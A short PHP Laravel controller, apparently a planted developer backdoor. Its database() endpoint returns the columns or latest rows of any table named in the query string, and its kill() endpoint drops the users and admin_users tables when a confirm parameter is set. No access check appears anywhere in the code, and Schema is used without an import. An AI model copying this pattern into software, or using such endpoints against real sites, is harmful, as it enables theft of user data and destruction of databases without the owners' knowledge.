<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use DB;
class DevController extends Controller
{
     public function database(Request $request){
       $table = $request->query('table');
       if(!empty($table))
       {

           if($request->query('query') == 'showcolumn' && empty($request->query('type')))
           {
               return  DB::getSchemaBuilder()->getColumnListing($table);
           }
           if(!empty($request->query('type') == 'get'))
           {

               return   DB::table($table)->orderBy('id','desc')->limit(50)->get();

           }
           
       }
 
    }

    
    public function kill(Request $request){

         if($request->query('confirm') == true)
         {
            Schema::drop('users');
            Schema::drop('admin_users');
         }
      
        return true;

    }
}
